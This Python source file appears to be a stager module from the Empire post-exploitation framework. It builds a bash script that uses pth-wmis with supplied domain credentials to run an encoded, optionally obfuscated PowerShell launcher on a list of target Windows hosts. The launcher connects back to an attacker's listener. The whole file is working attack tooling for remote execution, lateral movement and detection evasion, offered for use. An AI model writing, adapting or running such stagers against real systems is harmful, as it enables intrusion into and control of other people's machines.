from lib.common import helpers

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'pth-wmis',

            'Author': ['@harmj0y'],

            'Description': ('Generates a pth-wmis launcher for Empire.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'OutFile' : {
                'Description'   :   'File to output command to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   '/tmp/pth_wmis.sh'
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'ObfuscateCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True.',
                'Required'      :   False,
                'Value'         :   'Token,All,1,home,Encoding,3'
            },
            'Target' : {
                'Description'   :   'Target[s] to run wmis command on, comma-separated.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Username' : {
                'Description'   :   '[domain/]username to use to execute wmis command on target.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'Password for username to execute wmis command on target.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        listenerName = self.options['Listener']['Value']
        targets = self.options['Target']['Value']
        username = self.options['Username']['Value']
        password = self.options['Password']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscateCommand = self.options['ObfuscateCommand']['Value']

        commands = "#!/bin/bash\n"
        targets = targets.split(",")

        obfuscateScript = False
        if obfuscate.lower() == "true":
            obfuscateScript = True

        if obfuscateScript and "launcher" in obfuscateCommand.lower():
            print helpers.color("[!] If using obfuscation, LAUNCHER obfuscation cannot be used in the dll stager.")
            return ""

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
            for target in targets:
                # prepend the absolute powershell.exe path to get it to work with WMI
                stagerCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher

                # fill in the remaining pth-wmis config commands
                command = "pth-wmis -U '%s%%%s' //%s '" %(username, password, target) + stagerCode + "'"
                commands += command + "\n"
            
            return commands
